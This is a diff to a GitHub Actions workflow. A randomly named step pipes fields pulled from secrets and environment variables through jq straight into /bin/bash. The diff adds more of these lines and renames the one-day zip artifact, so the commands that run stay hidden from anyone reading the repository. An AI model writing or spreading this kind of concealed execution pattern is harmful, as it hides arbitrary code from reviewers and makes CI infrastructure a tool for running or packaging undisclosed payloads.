@@ -9,15 +9,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: edenpacker1411
         env:
-          yz29821: ${{ secrets.yz29821 }}
+          bzj01: ${{ secrets.bzj01 }}
         run: |
-          printf '%s' "$yz29821" | jq -r .xyn4981 | /bin/bash
-          printf '%s' "$yce148" | jq -r .e4 | /bin/bash
-          echo $ttw3347 | jq -r .hy0 | /bin/bash
+          printf '%s' "$bzj01" | jq -r .tm89293 | /bin/bash
+          printf '%s' "$capen731" | jq -r .bh50 | /bin/bash
+          echo $hh292 | jq -r .qx2 | /bin/bash
+          echo $ufo2278 | jq -r .fylhm576 | /bin/bash
+          printf '%s' "$jdthf2739" | jq -r .nmk34 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: P6QfSV1g
+          name: Uy88ggdk
           path: "*.zip"
           retention-days: 1
